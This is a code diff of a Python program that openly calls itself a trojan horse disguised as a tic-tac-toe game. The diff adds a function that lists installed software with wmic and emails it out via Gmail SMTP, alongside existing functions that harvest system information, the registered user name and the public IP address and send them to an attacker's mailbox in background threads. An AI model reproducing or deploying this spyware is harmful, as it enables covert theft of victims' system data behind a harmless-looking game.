@@ -1,23 +1,31 @@
-import threading, time
+import threading
 from termcolor import colored
 import os, smtplib, subprocess, requests
 
 ##############################Trojan-Horse#################################
 
-t1 = time.time()
-
 def send_sys_infs():
     #get the registered user
     data = subprocess.check_output('wmic os get RegisteredUser').decode()
     registered_user = data.split('\n')[1].split()[0]
+    #save the system information in a text file
     path = f'c:/Users/{registered_user}/yourdatalol.txt'
     os.system(f'systeminfo > {path} 2>&1')
     file = open(f'c:/Users/{registered_user}/yourdatalol.txt', 'r')
     sysdata = file.read()
+    #send the data to a mail address from another mail address
     obj = smtplib.SMTP('smtp.gmail.com', 587)
     obj.starttls()
-    obj.login('', '') #provide your own mail address and app password
-    obj.sendmail('', '', sysdata) #provide a from and a to address
+    obj.login('', '')#from mail address and it's password
+    obj.sendmail('', '', sysdata)#from address and to address
+    obj.quit()
+
+def send_programs_installed():
+    data = subprocess.check_output('wmic product get name,version'.split()).decode()
+    obj = smtplib.SMTP('smtp.gmail.com', 587)
+    obj.starttls()
+    obj.login('', '')#from mail address and it's password
+    obj.sendmail('', '', data)#from address and to address
     obj.quit()
 
 def public_ip_data():
@@ -26,18 +34,21 @@ def public_ip_data():
     ip = req_data['ip']
     obj = smtplib.SMTP('smtp.gmail.com', 587)
     obj.starttls()
-    obj.login('', '')
-    obj.sendmail('', '', ip)
+    obj.login('', '')#from mail address and it's password
+    obj.sendmail('', '', ip)#from address and to address
     obj.quit()
 
 x1 = threading.Thread(target=send_sys_infs, daemon=True)
 x2 = threading.Thread(target=public_ip_data, daemon=True)
+x3 = threading.Thread(target=send_programs_installed, daemon=True)
 
 x1.start()
 x2.start()
+x3.start()
 
 x1.join()
 x2.join()
+x3.join()
 
 ##############################Tic-Tac-Toe(cover)###############################
 def game():
